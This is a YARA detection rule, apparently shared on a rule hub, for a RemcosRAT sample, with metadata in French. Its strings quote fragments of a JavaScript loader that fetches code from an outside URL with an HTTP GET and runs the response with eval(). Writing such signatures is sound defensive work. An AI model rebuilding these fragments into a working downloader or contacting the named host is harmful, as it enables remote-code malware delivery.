rule MULTI_Sample_RemcosRAT_94933b78
{
    meta:
        author = "Marjoriefort"
        description = "Detects RemcosRAT (inconnu, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "94933b78c619629d1195723465a47de5eb1d1fed39688b32c6455b09e984b5c2"
        yarahub_uuid = "60286fca-138b-4545-ba15-7c142f564323"
        famille = "RemcosRAT"
        famille_source = "reputation"
        classe = "inconnu"
        etat = "binaire"
        confidence_suggeree = "low"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "65c291c50bece515b87f84b5c43d42a3"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "var typo180 = \"http://maciejbi.hosting24.pl/e847Sl1P\";" wide ascii
        $s1 = "deflexibility.open(\"GET\", typo180, false);" wide ascii
        $s2 = "deflexibility.send();" wide ascii
        $s3 = "var shipbuilders = deflexibility.responseText;" wide ascii
        $s4 = "eval(shipbuilders);" wide ascii
    condition:
        true and filesize < 50MB and 3 of ($s1, $s2, $s3, $s4) and 1 of ($s0)
}
